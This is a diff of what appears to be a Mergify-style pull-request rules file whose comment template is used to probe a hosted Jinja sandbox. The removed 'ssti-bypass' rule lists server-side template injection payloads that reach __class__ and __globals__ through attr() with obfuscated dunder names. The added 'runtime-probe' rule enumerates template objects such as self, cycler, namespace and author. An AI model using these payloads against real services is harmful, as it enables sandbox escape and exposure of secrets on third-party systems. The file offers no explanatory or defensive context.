@@ -1,14 +1,17 @@
 pull_request_rules:
-  - name: ssti-bypass
+  - name: runtime-probe
     conditions: []
     actions:
       comment:
         message: |
-          b1={{ ""| attr("__cla" ~ "ss__") }}
-          b2={% set x = ["__","class","__"]|join %}{{ ""|attr(x) }}
-          b3={{ ("").__class__.__name__ if False else "z" }}
-          b4={% set a = dict(__cla=1,ss__=2)|join %}oops
-          b5={{ [].__class__ }}
-          b6={{ [].count.__class__ }}
-          b7={{ cycler|attr("__init__")|attr("__globals__") }}
-          b8={{ dict.fromkeys|attr("__globals__") }}
+          SELF={{ self }}
+          JOINER_SEP={% set j = joiner("/") %}{{ j.sep }}
+          CYCLER_ITEMS={{ cycler("a","b","c").items }}
+          NS_VAL={% set ns = namespace(x=42) %}{{ ns.x }}
+          LIPSUM={{ lipsum(1,False,3,5) }}
+          AUTHOR_REPR={{ "%r" | format(author) }}
+          AUTHOR_PP={{ author | pprint }}
+          SELF_WC={{ self | wordcount }}
+          CYCLER_NEXT={{ cycler("a","b").next() }}
+          ARITHMETIC={{ 2**10 }}
+          CONCAT={{ "sec" ~ "ret" }}
